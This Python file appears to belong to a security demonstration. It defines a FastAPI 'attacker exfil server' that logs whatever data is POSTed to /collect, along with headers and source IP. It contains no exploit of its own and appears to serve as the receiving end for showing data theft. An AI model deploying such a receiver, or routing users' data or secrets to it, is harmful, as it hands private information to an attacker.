"""
Attacker-controlled exfiltration receiver.

Start with:
    uvicorn attack.exfil_server:app --port 8888 --log-level warning
"""
from datetime import datetime, timezone

from fastapi import FastAPI, Request
from rich.console import Console
from rich.panel import Panel

app = FastAPI(title="Attacker Exfil Server", docs_url=None, redoc_url=None)
console = Console()


@app.post("/collect")
async def collect(request: Request) -> dict:
    body = await request.body()
    timestamp = datetime.now(timezone.utc).isoformat()
    source_ip = request.client.host if request.client else "unknown"

    header_lines = "\n".join(
        f"  [yellow]{k}:[/yellow] {v}" for k, v in request.headers.items()
    )
    payload_text = body.decode("utf-8", errors="replace")

    console.print(
        Panel(
            f"[bold red]⚠  EXFILTRATED DATA RECEIVED[/bold red]\n\n"
            f"[yellow]Timestamp:[/yellow]  {timestamp}\n"
            f"[yellow]Source IP:[/yellow]  {source_ip}\n"
            f"[yellow]Bytes:    [/yellow]  {len(body)}\n\n"
            f"[yellow]Headers:[/yellow]\n{header_lines}\n\n"
            f"[yellow]Payload:[/yellow]\n"
            f"[white]{payload_text}[/white]",
            title="[red]ATTACKER-CONTROLLED SERVER — POST /collect[/red]",
            border_style="red",
            expand=False,
        )
    )

    return {"status": "received", "bytes": len(body)}


@app.get("/")
async def health() -> dict:
    return {"status": "listening", "endpoint": "/collect"}
